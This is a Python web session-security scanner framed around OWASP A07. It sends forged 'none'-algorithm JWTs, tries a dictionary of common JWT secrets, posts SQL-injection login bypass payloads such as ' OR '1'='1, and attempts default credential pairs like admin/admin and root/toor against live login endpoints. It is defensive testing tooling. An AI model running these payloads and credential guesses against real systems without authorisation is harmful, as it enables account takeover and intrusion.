#!/usr/bin/env python3
"""
Session Security Scanner - JWT, Cookies, CSRF, Authentication Testing
Context7 reviewed: PyJWT best practices applied
OWASP A07:2021 - Identification and Authentication Failures
"""

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
import jwt
from jwt.exceptions import InvalidTokenError, ExpiredSignatureError, InvalidAudienceError
import re
import base64
import json
import hashlib
import secrets
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs
import time


class SessionScanner:
    """
    Comprehensive session and authentication security scanner
    Tests JWT, cookies, CSRF, and authentication mechanisms
    """
    
    def __init__(self):
        self.connect_timeout = 3.0
        self.read_timeout = 5.0
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        
        # Common JWT secrets for dictionary attack
        self.common_secrets = [
            'secret', 'Secret', 'SECRET',
            'password', 'Password', 'PASSWORD',
            '123456', 'admin', 'test',
            'secret_key', 'your-256-bit-secret',
            'your_secret_key', 'mysecret',
            'jwt_secret', 'token_secret'
        ]
        
        # Default credentials
        self.default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('root', 'toor'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('test', 'test'),
            ('guest', 'guest'),
        ]
    
    def _make_request(self, url: str, method: str = 'GET', **kwargs) -> requests.Response:
        """
        Make HTTP request with proper timeout and error handling
        Context7 pattern: separate connect/read timeouts
        """
        try:
            timeout = kwargs.pop('timeout', (self.connect_timeout, self.read_timeout))
            headers = kwargs.get('headers', {})
            if 'User-Agent' not in headers:
                headers['User-Agent'] = self.user_agent
            kwargs['headers'] = headers
            
            if method == 'GET':
                return requests.get(url, timeout=timeout, **kwargs)
            elif method == 'POST':
                return requests.post(url, timeout=timeout, **kwargs)
            else:
                raise ValueError(f"Unsupported method: {method}")
                
        except Timeout:
            raise
        except ConnectionError:
            raise
        except RequestException as e:
            raise
    
    def scan_target(self, target: str) -> Dict[str, Any]:
        """Run all session security tests on target"""
        results = {
            'jwt_vulnerabilities': [],
            'session_issues': [],
            'cookie_security': [],
            'csrf_issues': [],
            'auth_bypass': []
        }
        
        print(f"[*] Starting session security scan on {target}")
        
        # Test JWT vulnerabilities
        jwt_vulns = self.test_jwt_security(target)
        results['jwt_vulnerabilities'] = jwt_vulns
        
        # Test cookie security
        cookie_vulns = self.test_cookie_security(target)
        results['cookie_security'] = cookie_vulns
        
        # Test session management
        session_vulns = self.test_session_management(target)
        results['session_issues'] = session_vulns
        
        # Test CSRF protection
        csrf_vulns = self.test_csrf_protection(target)
        results['csrf_issues'] = csrf_vulns
        
        # Test authentication bypass
        auth_vulns = self.test_auth_bypass(target)
        results['auth_bypass'] = auth_vulns
        
        return results
    
    # =================================================================
    # JWT VULNERABILITY TESTS
    # =================================================================
    
    def test_jwt_security(self, target: str) -> List[Dict]:
        """Test for JWT vulnerabilities"""
        vulns = []
        
        try:
            # Try to find JWT tokens in responses
            resp = self._make_request(target)
            
            # Look for JWT in various places
            jwt_tokens = self._extract_jwt_tokens(resp)
            
            if not jwt_tokens:
                return vulns
            
            for token in jwt_tokens[:3]:  # Test first 3 tokens found
                # Test 1: None algorithm attack
                none_vuln = self._test_jwt_none_algorithm(target, token)
                if none_vuln:
                    vulns.append(none_vuln)
                
                # Test 2: Weak secret
                weak_secret_vuln = self._test_jwt_weak_secret(token)
                if weak_secret_vuln:
                    vulns.append(weak_secret_vuln)
                
                # Test 3: Algorithm confusion
                algo_confusion = self._test_jwt_algorithm_confusion(target, token)
                if algo_confusion:
                    vulns.append(algo_confusion)
                
                # Test 4: Expired token acceptance
                expired_vuln = self._test_jwt_expired_token(target, token)
                if expired_vuln:
                    vulns.append(expired_vuln)
                
                # Test 5: Manipulate claims
                claims_vuln = self._test_jwt_claims_manipulation(target, token)
                if claims_vuln:
                    vulns.append(claims_vuln)
                
        except (Timeout, ConnectionError, RequestException):
            pass
        
        return vulns
    
    def _extract_jwt_tokens(self, response: requests.Response) -> List[str]:
        """Extract JWT tokens from response"""
        tokens = []
        
        # JWT pattern: three base64 parts separated by dots
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        
        # Check response body
        body_tokens = re.findall(jwt_pattern, response.text)
        tokens.extend(body_tokens)
        
        # Check headers
        for header, value in response.headers.items():
            if isinstance(value, str):
                header_tokens = re.findall(jwt_pattern, value)
                tokens.extend(header_tokens)
        
        # Check cookies
        for cookie in response.cookies:
            cookie_tokens = re.findall(jwt_pattern, str(cookie.value))
            tokens.extend(cookie_tokens)
        
        return list(set(tokens))  # Remove duplicates
    
    def _test_jwt_none_algorithm(self, target: str, token: str) -> Optional[Dict]:
        """Test if server accepts 'none' algorithm (no signature)"""
        try:
            # Decode without verification to get payload
            # Context7: Use options parameter to disable signature verification
            payload = jwt.decode(
                token,
                options={"verify_signature": False}
            )
            
            # Re-encode with 'none' algorithm
            none_token = jwt.encode(
                payload,
                key="",
                algorithm="none"
            )
            
            # Try to use the token
            resp = self._make_request(
                target,
                headers={'Authorization': f'Bearer {none_token}'}
            )
            
            # If we get a non-401/403 response, it might be vulnerable
            if resp.status_code not in [401, 403]:
                return {
                    'type': 'JWT None Algorithm Attack',
                    'severity': 'CRITICAL',
                    'description': 'Server accepts JWT with "none" algorithm (no signature verification)',
                    'url': target,
                    'original_token': token[:50] + '...',
                    'exploit_token': none_token[:50] + '...',
                    'evidence': f'Server accepted unsigned JWT (status {resp.status_code})',
                    'cwe': 'CWE-347',
                    'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                }
        except Exception:
            pass
        
        return None
    
    def _test_jwt_weak_secret(self, token: str) -> Optional[Dict]:
        """Test if JWT uses weak secret"""
        try:
            # Try to decode with common secrets
            for secret in self.common_secrets:
                try:
                    # Context7: Explicitly specify algorithms for security
                    payload = jwt.decode(
                        token,
                        secret,
                        algorithms=["HS256", "HS512"]
                    )
                    
                    return {
                        'type': 'JWT Weak Secret',
                        'severity': 'CRITICAL',
                        'description': f'JWT signed with weak/common secret: "{secret}"',
                        'token': token[:50] + '...',
                        'cracked_secret': secret,
                        'payload': payload,
                        'evidence': 'Token successfully decoded with dictionary attack',
                        'cwe': 'CWE-521',
                        'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                    }
                except (InvalidTokenError, ExpiredSignatureError):
                    continue
        except Exception:
            pass
        
        return None
    
    def _test_jwt_algorithm_confusion(self, target: str, token: str) -> Optional[Dict]:
        """Test RS256 -> HS256 algorithm confusion"""
        try:
            # Decode without verification to check algorithm
            header = jwt.get_unverified_header(token)
            
            if header.get('alg') == 'RS256':
                # Try to convert to HS256
                payload = jwt.decode(
                    token,
                    options={"verify_signature": False}
                )
                
                # Re-sign with HS256 using the public key as secret
                # This is a real vulnerability if server uses public key to verify HS256
                confused_token = jwt.encode(
                    payload,
                    "public_key_here",  # Would need actual public key
                    algorithm="HS256"
                )
                
                return {
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'HIGH',
                    'description': 'JWT uses RS256 - potential algorithm confusion attack',
                    'url': target,
                    'original_algorithm': 'RS256',
                    'attack_vector': 'Change to HS256 and sign with public key',
                    'evidence': 'Token uses asymmetric algorithm (RS256)',
                    'cwe': 'CWE-347',
                    'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                }
        except Exception:
            pass
        
        return None
    
    def _test_jwt_expired_token(self, target: str, token: str) -> Optional[Dict]:
        """Test if server accepts expired tokens"""
        try:
            # Try to decode and check for exp claim
            payload = jwt.decode(
                token,
                options={"verify_signature": False}
            )
            
            if 'exp' in payload:
                # Create an expired token
                expired_payload = payload.copy()
                expired_payload['exp'] = int(time.time()) - 3600  # 1 hour ago
                
                # For testing, we'd need the secret (which we don't have)
                # But we can report the potential issue
                return {
                    'type': 'JWT Expiration Check',
                    'severity': 'MEDIUM',
                    'description': 'JWT contains expiration claim - verify server validates it',
                    'url': target,
                    'token': token[:50] + '...',
                    'expiration': payload['exp'],
                    'recommendation': 'Test if server accepts tokens with past exp timestamps',
                    'cwe': 'CWE-613',
                    'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                }
        except Exception:
            pass
        
        return None
    
    def _test_jwt_claims_manipulation(self, target: str, token: str) -> Optional[Dict]:
        """Test if JWT claims can be manipulated"""
        try:
            # Decode to see claims
            payload = jwt.decode(
                token,
                options={"verify_signature": False}
            )
            
            # Check for sensitive claims
            sensitive_claims = ['role', 'admin', 'is_admin', 'user_id', 'permissions', 'scope']
            found_claims = [c for c in sensitive_claims if c in payload]
            
            if found_claims:
                return {
                    'type': 'JWT Client-Trusted Claims',
                    'severity': 'HIGH',
                    'description': 'JWT contains sensitive claims that could be manipulated',
                    'url': target,
                    'token': token[:50] + '...',
                    'sensitive_claims': found_claims,
                    'payload': payload,
                    'attack': 'Modify claims like role=admin if signature not verified',
                    'cwe': 'CWE-639',
                    'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                }
        except Exception:
            pass
        
        return None
    
    # =================================================================
    # COOKIE SECURITY TESTS
    # =================================================================
    
    def test_cookie_security(self, target: str) -> List[Dict]:
        """Test cookie security attributes"""
        vulns = []
        
        try:
            resp = self._make_request(target)
            
            for cookie in resp.cookies:
                # Check HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    vulns.append({
                        'type': 'Missing HttpOnly Flag',
                        'severity': 'MEDIUM',
                        'description': f'Cookie "{cookie.name}" missing HttpOnly flag',
                        'url': target,
                        'cookie_name': cookie.name,
                        'evidence': 'JavaScript can read this cookie',
                        'impact': 'XSS attacks can steal session cookies',
                        'cwe': 'CWE-1004',
                        'owasp_2021': 'A05:2021-Security Misconfiguration'
                    })
                
                # Check Secure flag
                if not cookie.secure and urlparse(target).scheme == 'https':
                    vulns.append({
                        'type': 'Missing Secure Flag',
                        'severity': 'MEDIUM',
                        'description': f'Cookie "{cookie.name}" missing Secure flag on HTTPS site',
                        'url': target,
                        'cookie_name': cookie.name,
                        'evidence': 'Cookie can be sent over unencrypted HTTP',
                        'impact': 'Man-in-the-middle attacks can intercept cookies',
                        'cwe': 'CWE-614',
                        'owasp_2021': 'A05:2021-Security Misconfiguration'
                    })
                
                # Check SameSite attribute
                if not cookie.has_nonstandard_attr('SameSite'):
                    vulns.append({
                        'type': 'Missing SameSite Attribute',
                        'severity': 'MEDIUM',
                        'description': f'Cookie "{cookie.name}" missing SameSite attribute',
                        'url': target,
                        'cookie_name': cookie.name,
                        'evidence': 'No CSRF protection via SameSite',
                        'impact': 'Vulnerable to CSRF attacks',
                        'cwe': 'CWE-352',
                        'owasp_2021': 'A01:2021-Broken Access Control'
                    })
                
        except (Timeout, ConnectionError, RequestException):
            pass
        
        return vulns
    
    # =================================================================
    # SESSION MANAGEMENT TESTS
    # =================================================================
    
    def test_session_management(self, target: str) -> List[Dict]:
        """Test session management vulnerabilities"""
        vulns = []
        
        try:
            # Test session fixation
            fixation_vuln = self._test_session_fixation(target)
            if fixation_vuln:
                vulns.append(fixation_vuln)
            
            # Test predictable session IDs
            predictable_vuln = self._test_predictable_sessions(target)
            if predictable_vuln:
                vulns.append(predictable_vuln)
            
        except (Timeout, ConnectionError, RequestException):
            pass
        
        return vulns
    
    def _test_session_fixation(self, target: str) -> Optional[Dict]:
        """Test for session fixation vulnerability"""
        try:
            # Get initial session
            resp1 = self._make_request(target)
            initial_cookies = resp1.cookies
            
            if not initial_cookies:
                return None
            
            # Make authenticated request (simulated)
            resp2 = self._make_request(target, cookies=initial_cookies)
            final_cookies = resp2.cookies
            
            # Check if session ID changed after "login"
            # In real scenario, you'd actually login
            session_cookie_names = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'session', 'sessionid']
            
            for cookie_name in session_cookie_names:
                if cookie_name in initial_cookies and cookie_name in final_cookies:
                    if initial_cookies[cookie_name] == final_cookies[cookie_name]:
                        return {
                            'type': 'Session Fixation',
                            'severity': 'HIGH',
                            'description': 'Session ID does not change after authentication',
                            'url': target,
                            'cookie_name': cookie_name,
                            'evidence': 'Same session ID before and after login',
                            'impact': 'Attacker can force victim to use known session ID',
                            'cwe': 'CWE-384',
                            'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                        }
        except Exception:
            pass
        
        return None
    
    def _test_predictable_sessions(self, target: str) -> Optional[Dict]:
        """Test if session IDs are predictable"""
        try:
            session_ids = []
            
            # Get multiple session IDs
            for _ in range(3):
                resp = self._make_request(target)
                for cookie in resp.cookies:
                    if 'session' in cookie.name.lower():
                        session_ids.append(cookie.value)
                time.sleep(0.5)
            
            if len(session_ids) >= 2:
                # Check if IDs are sequential or have low entropy
                # Simple check: if IDs are numeric and sequential
                try:
                    numeric_ids = [int(sid, 16) if sid.isalnum() else int(sid) for sid in session_ids]
                    if len(numeric_ids) >= 2:
                        diff = abs(numeric_ids[1] - numeric_ids[0])
                        if diff < 100:  # Very close values = predictable
                            return {
                                'type': 'Predictable Session IDs',
                                'severity': 'HIGH',
                                'description': 'Session IDs appear to be predictable',
                                'url': target,
                                'evidence': f'Sequential or low-entropy session IDs detected',
                                'sample_ids': session_ids[:2],
                                'impact': 'Attacker can guess valid session IDs',
                                'cwe': 'CWE-330',
                                'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                            }
                except (ValueError, TypeError):
                    pass
        except Exception:
            pass
        
        return None
    
    # =================================================================
    # CSRF PROTECTION TESTS
    # =================================================================
    
    def test_csrf_protection(self, target: str) -> List[Dict]:
        """Test CSRF protection"""
        vulns = []
        
        try:
            resp = self._make_request(target)
            
            # Check for CSRF tokens in forms
            if '<form' in resp.text.lower():
                csrf_tokens = re.findall(
                    r'<input[^>]+name=["\']([^"\']*csrf[^"\']*)["\']',
                    resp.text,
                    re.IGNORECASE
                )
                
                if not csrf_tokens:
                    vulns.append({
                        'type': 'Missing CSRF Tokens',
                        'severity': 'MEDIUM',
                        'description': 'Forms found without CSRF protection',
                        'url': target,
                        'evidence': 'No CSRF token fields detected in HTML forms',
                        'impact': 'Application vulnerable to Cross-Site Request Forgery',
                        'cwe': 'CWE-352',
                        'owasp_2021': 'A01:2021-Broken Access Control'
                    })
        except (Timeout, ConnectionError, RequestException):
            pass
        
        return vulns
    
    # =================================================================
    # AUTHENTICATION BYPASS TESTS
    # =================================================================
    
    def test_auth_bypass(self, target: str) -> List[Dict]:
        """Test authentication bypass techniques"""
        vulns = []
        
        # Test SQL injection auth bypass
        sql_bypass = self._test_sql_auth_bypass(target)
        if sql_bypass:
            vulns.append(sql_bypass)
        
        # Test default credentials
        default_creds = self._test_default_credentials(target)
        if default_creds:
            vulns.extend(default_creds)
        
        return vulns
    
    def _test_sql_auth_bypass(self, target: str) -> Optional[Dict]:
        """Test SQL injection authentication bypass"""
        sql_auth_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "admin' #",
            "' or '1'='1'/*",
        ]
        
        try:
            # Try common login endpoints
            login_paths = ['/login', '/signin', '/auth', '/admin/login']
            
            for path in login_paths:
                test_url = target.rstrip('/') + path
                
                for payload in sql_auth_payloads[:2]:  # Test first 2
                    try:
                        resp = self._make_request(
                            test_url,
                            method='POST',
                            data={
                                'username': payload,
                                'password': payload
                            }
                        )
                        
                        # Check for successful bypass indicators
                        if resp.status_code == 200 and any(x in resp.text.lower() for x in ['welcome', 'dashboard', 'logout', 'profile']):
                            return {
                                'type': 'SQL Injection Authentication Bypass',
                                'severity': 'CRITICAL',
                                'description': 'SQL injection allows authentication bypass',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Successful login with SQL injection payload (status {resp.status_code})',
                                'cwe': 'CWE-89',
                                'owasp_2021': 'A03:2021-Injection'
                            }
                    except (Timeout, ConnectionError, RequestException):
                        continue
        except Exception:
            pass
        
        return None
    
    def _test_default_credentials(self, target: str) -> List[Dict]:
        """Test for default credentials"""
        vulns = []
        
        try:
            # Try common login endpoints
            login_paths = ['/login', '/signin', '/auth', '/admin/login', '/admin']
            
            for path in login_paths:
                test_url = target.rstrip('/') + path
                
                for username, password in self.default_creds[:3]:  # Test first 3 pairs
                    try:
                        resp = self._make_request(
                            test_url,
                            method='POST',
                            data={
                                'username': username,
                                'password': password
                            }
                        )
                        
                        # Check for successful login
                        if resp.status_code == 200 and 'error' not in resp.text.lower():
                            vulns.append({
                                'type': 'Default Credentials',
                                'severity': 'CRITICAL',
                                'description': f'Default credentials accepted: {username}/{password}',
                                'url': test_url,
                                'username': username,
                                'password': password,
                                'evidence': f'Successful login with default credentials',
                                'cwe': 'CWE-798',
                                'owasp_2021': 'A07:2021-Identification and Authentication Failures'
                            })
                            break  # Found working creds, stop testing this endpoint
                            
                        time.sleep(0.5)  # Rate limit
                        
                    except (Timeout, ConnectionError, RequestException):
                        continue
        except Exception:
            pass
        
        return vulns
    
    def format_results(self, results: Dict) -> List[Dict]:
        """Format results for API response"""
        formatted = []
        
        # JWT vulnerabilities
        for vuln in results.get('jwt_vulnerabilities', []):
            formatted.append(vuln)
        
        # Cookie security issues
        for vuln in results.get('cookie_security', []):
            formatted.append(vuln)
        
        # Session management issues
        for vuln in results.get('session_issues', []):
            formatted.append(vuln)
        
        # CSRF issues
        for vuln in results.get('csrf_issues', []):
            formatted.append(vuln)
        
        # Authentication bypass
        for vuln in results.get('auth_bypass', []):
            formatted.append(vuln)
        
        return formatted


if __name__ == '__main__':
    # Test
    scanner = SessionScanner()
    
    print("=" * 70)
    print("🔐 Testing Session Security Scanner")
    print("=" * 70)
    
    # Test on a sample target
    results = scanner.scan_target('http://testphp.vulnweb.com')
    formatted = scanner.format_results(results)
    
    print(f"\n[+] Found {len(formatted)} session security issues")
    for v in formatted:
        print(f"  [{v['severity']}] {v['type']}: {v.get('description', 'No description')}")
    
    print("\n✅ Session scanner ready!")
